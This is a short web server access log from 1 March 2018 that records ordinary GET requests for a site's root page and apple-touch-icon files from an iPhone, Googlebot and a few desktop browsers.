1.75.213.91 - - [01/Mar/2018:01:11:45 +0000] "GET / HTTP/1.1" 200 1739 "http://arbcoin.live/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
208.80.194.28 - - [01/Mar/2018:01:14:56 +0000] "GET / HTTP/1.0" 200 9262 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.151 Safari/534.16"
1.75.213.91 - - [01/Mar/2018:01:16:25 +0000] "GET / HTTP/1.1" 200 1734 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [01/Mar/2018:01:16:26 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
1.75.213.91 - - [01/Mar/2018:01:16:27 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
1.75.213.91 - - [01/Mar/2018:01:16:27 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
1.75.213.91 - - [01/Mar/2018:01:16:27 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
1.75.213.91 - - [01/Mar/2018:01:22:56 +0000] "GET / HTTP/1.1" 200 1733 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [01/Mar/2018:01:23:03 +0000] "GET / HTTP/1.1" 200 1734 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [01/Mar/2018:01:26:08 +0000] "GET / HTTP/1.1" 200 1735 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
66.249.64.17 - - [01/Mar/2018:02:01:05 +0000] "GET / HTTP/1.1" 200 1736 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
153.202.82.179 - - [01/Mar/2018:02:42:24 +0000] "GET / HTTP/1.1" 200 1722 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
153.202.82.179 - - [01/Mar/2018:03:04:07 +0000] "GET / HTTP/1.1" 200 1735 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
66.249.64.17 - - [01/Mar/2018:04:59:01 +0000] "GET / HTTP/1.1" 200 1730 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
208.80.194.35 - - [01/Mar/2018:05:32:16 +0000] "GET / HTTP/1.0" 200 9268 "-" "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/4.0.1"
153.202.82.179 - - [01/Mar/2018:06:24:38 +0000] "GET / HTTP/1.1" 200 1722 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
1.75.213.91 - - [01/Mar/2018:07:18:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [01/Mar/2018:07:18:14 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
1.75.213.91 - - [01/Mar/2018:07:18:14 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
1.75.213.91 - - [01/Mar/2018:07:18:14 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
1.75.213.91 - - [01/Mar/2018:07:18:14 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
208.80.194.28 - - [01/Mar/2018:07:20:40 +0000] "GET / HTTP/1.0" 200 9266 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2)"
1.75.213.91 - - [01/Mar/2018:09:54:04 +0000] "GET / HTTP/1.1" 200 1737 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C114 Safari/604.1"
1.75.213.91 - - [01/Mar/2018:09:54:05 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
1.75.213.91 - - [01/Mar/2018:09:54:05 +0000] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
1.75.213.91 - - [01/Mar/2018:09:54:05 +0000] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 746 "-" "MobileSafari/604.1 CFNetwork/893.14.2 Darwin/17.3.0"
